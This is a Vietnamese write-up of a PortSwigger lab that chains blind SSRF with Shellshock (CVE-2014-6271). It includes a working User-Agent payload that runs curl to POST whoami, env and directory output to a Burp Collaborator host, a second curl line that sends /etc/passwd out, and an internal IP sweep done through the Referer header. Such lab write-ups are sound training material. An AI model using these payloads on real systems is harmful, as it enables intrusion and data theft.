# Lab: Blind SSRF with Shellshock exploitation
![image](https://user-images.githubusercontent.com/20487674/126906039-d66a6ca5-ddc0-4abf-ad5b-061a6923d3ae.png)

* Lab này sẽ có kèm theo một lỗ hổng shellshock(CVE-2014-6271) tồn tại bash version <= 4.3 Nguyên nhân của lỗ hổng này nằm ở một lỗ hổng trong thuật toán Bash phân tích các giá trị của các biến môi trường
* ![image](https://user-images.githubusercontent.com/20487674/126905732-47faac4d-850b-40a0-ab9b-7af6266ef438.png)

* Đọc thêm: [https://stackoverflow.com/questions/30998558/empty-function-in-bash](https://stackoverflow.com/questions/30998558/empty-function-in-bash)<br>
* Đọc thêm: [https://tldp.org/LDP/abs/html/functions.html](https://tldp.org/LDP/abs/html/functions.html)
* Đọc thêm: [https://www.shell-tips.com/bash/null-command/](https://www.shell-tips.com/bash/null-command/)
* Đọc thêm: [https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf](https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf)
* env liệt kê các biến môi trường và giá trị của biến
* ![image](https://user-images.githubusercontent.com/20487674/126905947-3684ba40-16c3-4744-bde7-56e405e6241e.png)

* env $TÊNBiến in giá trị biến môi trường
* ![image](https://user-images.githubusercontent.com/20487674/126905979-b18cf0e7-f3f0-4c60-9b19-1063164cabf5.png)

* printenv TÊNBiến in giá trị biến môi trường
* ![image](https://user-images.githubusercontent.com/20487674/126905993-675e9ff6-6c1a-4436-955a-cc9d1e993a94.png)

* echo $TÊNBiến in giá trị biến môi trường
* ![image](https://user-images.githubusercontent.com/20487674/126906000-be55a2c2-efa2-4014-8df1-774b22eda981.png)

* Do đó giúp chúng ta có thể rce đẩy dữ liệu từ bên trong server ra ngoài server burpcollaborator 
* Thì enpoint cũng như lab trước nằm ở referer ở phần header request
* Thay đổi giá trị user-agent: () { echo 1; }; /usr/bin/curl -X POST http://el33t6bv70npcmwo0185r70ttkzanz.burpcollaborator.net -d "$(whoami;env;ls -al)"
* Thay đổi giá trị referer: http://192.168.0.x:8080 giá trị x dùng intruder chạy từ 1 -> 255
![image](https://user-images.githubusercontent.com/20487674/126906692-551a6609-a2ab-43de-9833-6f93df22ef11.png)
![image](https://user-images.githubusercontent.com/20487674/126906707-b302e612-a6ac-46eb-b4c9-03d7af7365dc.png)

* Có thể dùng backtick: curl http://tyvjx3sb2do7u3hsn0hglppyapgf44.burpcollaborator.net/ -d "\`cat /etc/passwd\`"
* Submit thui ![image](https://user-images.githubusercontent.com/20487674/126906846-c0b1d4b6-4a86-4cf6-9cfd-6b5cf12b8c8d.png)
![image](https://user-images.githubusercontent.com/20487674/126906866-2ac5e231-2c69-4771-b9d4-6c69a49f8c1c.png)
